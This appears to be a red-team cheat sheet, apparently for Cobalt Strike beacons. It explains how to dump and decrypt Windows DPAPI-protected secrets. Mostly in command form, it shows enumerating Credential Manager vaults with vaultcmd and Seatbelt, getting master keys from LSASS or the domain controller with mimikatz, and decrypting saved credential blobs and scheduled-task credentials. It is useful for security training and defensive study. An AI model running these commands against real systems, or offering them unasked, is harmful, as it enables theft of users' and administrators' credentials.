# Data Protection API (DPAPI)

DPAPI is a Windows component that encrypts/decrypts data using cryptographic keys tied to a user or computer and allows both native Windows functionality and third-party applications to protect data transparently to the user. DPAPI is used by the Windows Credential Manager to store saved secrets such as RDP credentials, and by applications like Google Chrome to store website credentials.

## Windows Credential Manager

* A credential is the actual encrypted credential data. 
* A vault holds records of encrypted credentials and a reference to the encrypted blobs. Windows has two vaults:
  * Web Credentials (for storing browser credentials)
  * Windows Credentials (for storing credentials saved by mstsc, etc)

1: To enumerate a user's vaults, use the native vaultcmd tool or SeatBelt from a beacon: 
* ```run vaultcmd /list```
* ```run vaultcmd /listcreds:"Windows Credentials" /all```
* ```execute-assembly Seatbelt.exe -group=<user>```
* ```execute-assembly Seatbelt.exe WindowsVault```

2: If a user has saved credentials for the local administrator account on a machine, the encrypted credentials are stored in the users' C:\Users\<user>\AppData\Local\Microsoft\Credentials directory. To enumerate those files: 

```execute-assembly Seatbelt.exe WindowsCredentialFiles```

Seatbelt also gives the GUID of the master key used to encrypt the creds; they're stored encrypted in C:\Users\<user>\AppData\Roaming\Microsoft\Protect\S-1-5...\<GUID>\

3: Need to decrypt the master key to obtain the encryption key, then use that key to decrypt the creds. 

If have local admin and the key is cached in LSASS (user has recently used the cred): Use ```mimikatz !sekurlsa::dpapi``` and compare the GUID it returns; if a match, this is the kay to use.

If not local admin (don't need LSASS): as the user whose key it is, request it from the domain controller via the Microsoft BackupKey Remote Protocol (MS-BKRP): Use ```mimikatz dpapi::masterkey /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\S-1-5...\<GUID> /rpc```

4: Decrypt the blob: ```mimikatz dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<cred filename> /masterkey:8d15...```

## Scheduled Task Credentials

Scheduled Tasks can save creds to be run under the context of a user without logging on. With local admin privileges, we can decrypt them.

    beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

1: Find the GUID of the master key used to encrypt each cred:

    beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

2: Dump cached keys:

    beacon> mimikatz !sekurlsa::dpapi

3: Decrypt:

    beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\<file> masterkey:10530....

